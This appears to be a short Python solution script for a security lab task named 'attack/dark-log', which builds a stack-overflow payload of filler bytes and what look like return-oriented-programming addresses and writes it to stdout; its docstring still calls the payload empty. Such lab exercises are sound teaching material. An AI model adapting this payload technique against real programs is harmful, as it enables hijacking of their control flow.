#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

payload  = b"A" * 8                                               
payload += bytes.fromhex("a3 18 40 00 00 00 00 00")    
payload += bytes.fromhex("04 00 00 00 00 00 00 00")    
payload += bytes.fromhex("a4 18 40 00 00 00 00 00")     
payload += bytes.fromhex("77 16 40 00 00 00 00 00")     
payload += b"A" * 8                                     
payload += b"B" * 80                                    
payload += b"B" * 128                                  
payload += bytes.fromhex("a0 00 00 00")      
           
sys.stdout.buffer.write(payload)
